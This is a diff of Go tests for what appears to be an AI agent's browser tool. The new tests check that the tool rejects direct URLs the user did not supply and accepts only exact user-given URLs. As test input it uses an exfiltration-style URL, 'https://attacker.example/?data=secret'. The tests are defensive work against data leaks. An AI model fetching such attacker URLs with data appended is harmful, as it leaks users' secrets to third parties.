@@ -1,4 +1,4 @@
-//go:build windows || darwin
+//go:build windows || darwin || linux
 
 package tools
 
@@ -62,6 +62,27 @@ func TestBrowserOpen_UseCacheByURL(t *testing.T) {
 	}
 	if got, want := len(b.state.Data.URLToPage), initialMapLen; got != want {
 		t.Fatalf("url_to_page length changed = %d, want %d", got, want)
+	}
+}
+
+func TestBrowserOpen_RejectsUncachedDirectURL(t *testing.T) {
+	b := NewBrowser(&responses.BrowserStateData{PageStack: []string{}, ViewTokens: 1024, URLToPage: map[string]*responses.Page{}})
+	bo := NewBrowserOpen(b)
+
+	_, _, err := bo.Execute(t.Context(), map[string]any{"id": "https://attacker.example/?data=secret"})
+	if err == nil || !strings.Contains(err.Error(), "only allowed for URLs provided by the user") {
+		t.Fatalf("expected direct URL rejection, got %v", err)
+	}
+}
+
+func TestDirectURLsFromText_AllowsExactUserURLsOnly(t *testing.T) {
+	ctx := WithAllowedDirectURLs(t.Context(), "summarize https://example.com/article?q=1 please")
+
+	if !allowedDirectURL(ctx, "https://example.com/article?q=1") {
+		t.Fatal("expected exact user-provided URL to be allowed")
+	}
+	if allowedDirectURL(ctx, "https://example.com/article?q=secret") {
+		t.Fatal("did not expect modified URL to be allowed")
 	}
 }
 
